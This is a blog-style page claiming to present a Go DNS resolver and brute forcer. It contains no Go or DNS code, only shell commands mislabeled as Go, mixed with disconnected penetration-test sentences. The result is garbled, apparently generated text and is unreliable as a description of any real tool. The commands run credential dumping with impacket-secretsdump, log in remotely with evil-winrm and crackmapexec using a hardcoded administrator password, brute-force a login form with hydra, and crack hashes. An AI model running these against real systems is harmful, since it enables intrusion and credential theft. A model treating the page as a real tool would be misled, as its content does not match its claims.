---
TitleSEO: "DNS Resolver and Brute Forcer in Go | ZureFX"
TitlePost: "DNS Resolver and Brute Forcer — Go"
Author: "ZureFX"
Description: "A Go script for dns resolver and brute forcer. Built for security research and automation."
Keywords: "rust, c, fuzzer, powershell, go"
URL: "https://zurefx.github.io/scripting/script-dns-resolver-and-brute-forcer-521.html"
URL_IMAGES: ""
Date: "2026-01-18"
Tags: "Rust, C, Fuzzer, PowerShell, Go"
Section: "scripting"
Lang: "en"
main_img: "script-dns-resolver-and-brute-forcer-521"
Permalink: "/scripting/script-dns-resolver-and-brute-forcer-521.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

Token impersonation allowed elevation to SYSTEM privileges on the target. The web application was vulnerable to Server-Side Template Injection (SSTI). The application stored sensitive credentials in an unencrypted configuration file.

Built with **Go** for offensive security automation.

### Requirements

- Go
- `secretsdump`
- `kerbrute`
- `gobuster`

## Implementation

### Core Logic

Post-exploitation enumeration revealed a path to domain administrator privileges. Command injection was possible through unsanitized user input in the search functionality.

```go
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.104.173.52/FUZZ
impacket-secretsdump administrator:'P@ssw0rd!'@10.128.240.253
impacket-secretsdump administrator:'P@ssw0rd!'@10.82.20.65
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Privilege escalation was possible due to misconfigured sudo permissions. The target system was identified as running a vulnerable version of the service.

### Helper Functions

Initial enumeration revealed several interesting open ports on the target. Lateral movement was facilitated by reusing discovered credentials across services.

```go
evil-winrm -i 10.67.240.67 -u administrator -p 'P@ssw0rd!'
evil-winrm -i 10.65.184.191 -u administrator -p 'P@ssw0rd!'
nmap -sCV -p27017,27017,993 10.14.249.138 -oN scan.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

## Usage

### Basic Usage

The target system was identified as running a vulnerable version of the service. Command injection was possible through unsanitized user input in the search functionality.

```bash
crackmapexec smb 10.29.105.119 -u administrator -p 'P@ssw0rd!' --shares
evil-winrm -i 10.17.147.31 -u administrator -p 'P@ssw0rd!'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.55.133.243 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
feroxbuster -h
```

### Advanced Options

The application stored sensitive credentials in an unencrypted configuration file. Network traffic analysis revealed unencrypted communications containing user credentials. Authentication bypass was achieved through careful manipulation of the login mechanism.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.60.16.245
```

## Output

### Example Output

Group Policy Preferences contained encrypted but recoverable credentials. Unconstrained delegation was enabled on the compromised machine.

```
[+] Scanning target...
[+] Found 16 results
[+] Done in 1.47s
```
